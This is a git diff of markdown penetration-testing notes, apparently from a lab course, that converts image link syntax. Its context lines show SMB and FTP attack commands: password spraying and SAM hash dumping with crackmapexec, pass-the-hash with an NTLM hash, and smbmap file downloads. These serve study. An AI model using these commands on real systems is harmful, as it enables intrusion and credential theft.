@@ -11,7 +11,7 @@ SMB is commonly used in Windows networks, and we will often find share folders i
 
 `Windows Explorer`, type the file share location, e.g.: `\\192.168.220.129\Finance\`
 
-![[Pasted image 20251003091909.png]]
+![](images/Pasted%20image%2020251003091909.png)
 
 `Windows CMD`, the command [dir](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir) displays a list of a directory's files and subdirectories.
 ```cmd
@@ -216,7 +216,7 @@ ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
 ## FTP Bounce Attack
 
 An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.
-![[Pasted image 20251003100354.png]]
+![](images/Pasted%20image%2020251003100354.png)
 
 The `Nmap` -b flag can be used to perform an FTP bounce attack:
 
@@ -297,14 +297,14 @@ SMB1 disabled no workgroup available
 ```bash
 $ smbmap -H 10.129.14.128
 ```
-![[Pasted image 20251003132506.png]]
+![](images/Pasted%20image%2020251003132506.png)
 
 Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:
 
 ```shell
 $ smbmap -H 10.129.14.128 -r notes
 ```
-![[Pasted image 20251003132535.png]]
+![](images/Pasted%20image%2020251003132535.png)
 ```bash
 $ smbmap -H 10.129.14.128 --download "notes\note.txt"
 
@@ -405,7 +405,7 @@ jurena
 ```bash
 $ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
 ```
-![[Pasted image 20251003133406.png]]
+![](images/Pasted%20image%2020251003133406.png)
 
 ## RCE (impacket-psexec)
 
@@ -462,14 +462,14 @@ Imagine we are in a network with multiple machines. Some of them share the same 
 ```bash
 $ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
 ```
-![[Pasted image 20251003134331.png]]
+![](images/Pasted%20image%2020251003134331.png)
 
 The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes.
 
 ```bash
 $ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 ```
-![[Pasted image 20251003134307.png]]
+![](images/Pasted%20image%2020251003134307.png)
 ## Pass-the-Hash (CrackMapExec)
 
 If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools. Here is an example of how this would work with `CrackMapExec`:
@@ -477,7 +477,7 @@ If we manage to get an NTLM hash of a user, and if we cannot crack it, we can st
 ```bash
 $ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
 ```
-![[Pasted image 20251003134440.png]]
+![](images/Pasted%20image%2020251003134440.png)
 
 ## Responder
 
